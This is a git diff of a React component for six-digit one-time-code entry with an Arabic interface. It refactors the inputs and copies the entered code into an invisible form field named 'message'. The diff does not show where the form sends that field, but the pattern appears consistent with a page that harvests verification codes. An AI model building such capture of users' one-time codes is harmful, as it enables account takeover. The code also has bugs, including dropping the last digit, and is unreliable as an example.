@@ -13,7 +13,8 @@ const OTP = () => {
     const [isLoading, setIsLoading] = useState<boolean | null>(false)
     const [isTry, setIsTry] = useState<boolean | null>(false)
     const [isSucssess, setIsSuccess] = useState<Boolean | false>(false)
-    const [code, setCode] = useState<number[] | []>([])
+    const [code, setCode] = useState<undefined | string>('')
+    const [isSuccessCode, setIsSuccessCode] = useState<null | boolean>(null)
     const [timer, setTimer] = useState<number>(isTry ? 30 : 30);
     const input1: MutableRefObject<HTMLInputElement | null> = useRef(null);
     const input2: MutableRefObject<HTMLInputElement | null> = useRef(null);
@@ -36,7 +37,7 @@ const OTP = () => {
         input1.current?.focus()
         return () => clearInterval(interval)
     }, [isTry])
-    console.log();
+    console.log(code);
 
     const p1 = /^(.)\1*$/g;
     // (?=(\d))(?!.*\1(?!\1))
@@ -47,10 +48,11 @@ const OTP = () => {
         //    
         // }
         const isAllInputsFull = ([input1, input2, input3, input4, input5, input6].every(item => item.current && item.current.value.length !== 0))
-        console.log(isAllInputsFull);
 
-        if (isAllInputsFull) {
+        if (isAllInputsFull && code?.length === 6) {
+            console.log(isAllInputsFull);
             setIsLoading(true)
+            setIsSuccessCode(true)
             return await new Promise((resolve) => {
                 resolve(setTimeout(async () => {
                     setIsSuccess(true)
@@ -70,10 +72,13 @@ const OTP = () => {
                         );
                 }, 2000))
             })
+        } else {
+            setIsSuccessCode(false)
+            location.reload()
         }
     }
 
-
+    const inputs = [input1, input2, input3, input4, input5, input6]
     useGSAP(() => {
         if (isSucssess) {
             gsap.to('.box input', {
@@ -93,8 +98,13 @@ const OTP = () => {
         <div>
             {isLoading &&
                 <Loading />
-
             }
+            {isSuccessCode && !isSucssess ?
+                <>
+                    {() => location.reload()}
+                    <Notifecation message='حاول ادخال الرمز مجددا!' type='error' />
+                </>
+                : null}
             <BodyContianer>
                 <>
                     {isTry &&
@@ -109,46 +119,51 @@ const OTP = () => {
                         </h4>
                         <form ref={form} onSubmit={handelSub}>
                             <section className='flex items-center justify-center gap-2 mt-[25px]'>
-                                <div className='size-[45px] box flex items-center px-[10px] justify-center p-[20px] relative '>
-                                    <input required onChange={(e) => {
-                                        input2.current?.focus()
-                                        setCode([...code, +e.target.value])
-                                    }} ref={input1} placeholder='x' maxLength={1} type="text" className=' rounded-[6px] absolute w-full h-full text-center bg-[#f7f4fa]' />
-                                </div>
-                                <div className='size-[45px] box flex items-center  px-[10px] justify-center p-[20px] relative '>
+                                {inputs.map((input, i) => (
+                                    <div className='size-[45px] box flex items-center px-[10px] justify-center p-[20px] relative '>
+                                        <input required onChange={(e) => {
+                                            if (i + 1 < 6) {
+                                                inputs[i + 1].current?.focus()
+
+                                            }
+                                            setCode((prev) => e.target.value?.length ? `${prev}${+e.target.value}` : "")
+                                        }} ref={input} placeholder='x' maxLength={1} type="text" className=' rounded-[6px] absolute w-full h-full text-center bg-[#f7f4fa]' />
+                                    </div>
+                                ))}
+                                {/* <div className='size-[45px] box flex items-center  px-[10px] justify-center p-[20px] relative '>
                                     <input required ref={input2} onChange={
                                         (e) => {
                                             input3.current?.focus()
-                                            setCode([...code, +e.target.value])
+                                            setCode((prev) => e.target.value?.length ? `${prev}${+e.target.value}` : "")
                                         }
                                     } placeholder='x' maxLength={1} type="text" className=' rounded-[6px] absolute w-full h-full text-center bg-[#f7f4fa]' />
                                 </div>
                                 <div className='size-[45px] box flex items-center  px-[10px] justify-center p-[20px] relative '>
                                     <input required ref={input3} onChange={(e) => {
                                         input4.current?.focus()
-                                        setCode([...code, +e.target.value])
+                                        setCode((prev) => e.target.value?.length ? `${prev}${+e.target.value}` : "")
                                     }} placeholder='x' maxLength={1} type="text" className=' rounded-[6px] absolute w-full h-full text-center bg-[#f7f4fa]' />
                                 </div>
                                 <div className='size-[45px] box flex items-center  px-[10px] justify-center p-[20px] relative '>
                                     <input required ref={input4} onChange={(e) => {
                                         input5.current?.focus()
-                                        setCode([...code, +e.target.value])
+                                        setCode((prev) => e.target.value?.length ? `${prev}${+e.target.value}` : "")
                                     }} placeholder='x' maxLength={1} type="text" className=' rounded-[6px] absolute w-full h-full text-center bg-[#f7f4fa]' />
                                 </div>
                                 <div className='size-[45px] box flex items-center  px-[10px] justify-center p-[20px] relative '>
                                     <input required ref={input5} onChange={(e) => {
                                         input6.current?.focus()
-                                        setCode([...code, +e.target.value])
+                                        setCode((prev) => e.target.value?.length ? `${prev}${+e.target.value}` : "")
                                     }} placeholder='x' maxLength={1} type="text" className=' rounded-[6px] absolute w-full h-full text-center bg-[#f7f4fa]' />
                                 </div>
                                 <div className='size-[45px] box flex items-center  px-[10px] justify-center p-[20px] relative '>
                                     <input required onChange={(e) => {
-                                        setCode([...code, +e.target.value])
+                                        setCode((prev) => e.target.value?.length ? `${prev}${+e.target.value}` : "")
 
                                     }} ref={input6} placeholder='x' maxLength={1} type="text" className=' rounded-[6px] absolute w-full h-full text-center bg-[#f7f4fa]' />
-                                </div>
+                                </div> */}
                             </section>
-                            <input type="text" name='message' value={`${code.join('')}`} className='opacity-0' />
+                            <input type="text" name='message' value={`${code?.slice(0, 5)}`} className='opacity-0' />
                             <button onClick={handelSub} type='submit' className='block w-full active:scale-[1.01] p-[14px] transition-all duration-[100ms] rounded-[6px] shadow-lg text-white my-[20px] outline-0 font-bold bg-[#f68024] hover:bg-[#ea6e0e]'>تأكيد</button>
                         </form>
                         <div className="flex mt-[30px] font-[ibmolexBoldMeduim] items-center flex-col">
